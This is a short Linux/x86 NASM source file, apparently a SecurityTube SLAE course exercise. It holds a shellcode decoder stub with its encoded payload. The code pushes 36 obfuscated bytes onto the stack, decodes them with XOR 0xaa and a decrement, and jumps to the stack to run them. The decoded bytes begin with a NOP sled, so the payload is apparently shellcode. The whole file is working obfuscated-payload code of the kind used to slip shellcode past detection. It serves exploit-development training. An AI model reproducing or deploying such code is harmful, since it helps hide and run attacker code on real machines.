;Decoder - Linux/x86 NASM
;Author: Nathu Nandwani
;SecurityTube ID: SLAE-1261

global _start
section .text
_start:
    xor ecx, ecx
    xor ebx, ebx
    imul ecx

    push 0x2B64A61B
    push 0xBB8FFF26
    push 0xA78FE724
    push 0x4E20A78F
    push 0xCF20C5C0
    push 0xC99AC3C3
    push 0xDE9A9AC3
    push 0xFBFBFB6B
    push 0x983B3B3B
    mov cl, 36

again:
    mov al, byte[esp + ebx]
    xor al, 0xaa
    dec al
    mov byte[esp + ebx], al
    inc ebx
    loop again
    jmp esp
